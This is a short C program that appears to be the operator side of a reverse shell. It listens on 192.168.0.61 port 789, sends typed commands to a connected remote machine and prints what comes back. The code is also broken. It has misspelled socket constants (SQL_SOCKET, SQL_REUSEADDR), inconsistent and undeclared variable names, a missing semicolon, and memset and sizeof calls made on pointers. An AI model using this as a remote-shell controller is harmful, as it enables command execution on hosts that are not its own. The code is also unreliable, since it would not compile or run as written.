#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock, clientSock;
    char *buffer = malloc(sizeof(char) * 1024);
    char *response = malloc(sizeof(char) * 18384);
    struct sockaddr_in serverAddress, clientAddress;
    int optval = 1;
    socklen_t clientLength;

    sock = socket(AF_INET, SOCK_STREAM, 0); //use ipv4, use tcp for socket
    if(setsockopt(sock, SQL_SOCKET, SQL_REUSEADDR, &optval, sizeof(optval)) < 0) {
        //error
        printf("Error setting socket options\n");
        return 1;
    }
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr("192.168.0.61");
    serverAdress.sin_port = htons(789)

    //bind to port and listen
    bind(sock, (struct sockaddr *) &serverAddress, sizeof(serverAddress));
    listen(sock, 5); //takes in sock and max num of connections
    clientLength = sizeof(clientAddress);
    client_socket = accept(sock, (struct sockaddr *) &clientAddress, &clientLength);

    //main loop
    while(1) {
        //clear buffer and response
        memset(&buffer, 0, sizeof(buffer));
        memset(&response, 0, sizeof(response));

        printf("*Shell#%s~$: ", inet_ntoa(client_address.sin_addr));

        //get command
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, '\n'); //remove \n from string

        //send
        write(clientSock, buffer, sizeof(buffer));
        if(strncmp("q", buffer, 1) == 0) {
            return 0;
        } else {
            //receive response
            //MAG_WAITALL blocks process until response
            recv(client_socket, response, sizeof(response), MSG_WAITALL); 

            printf("%s", response);
        }
    }
    return 0;
}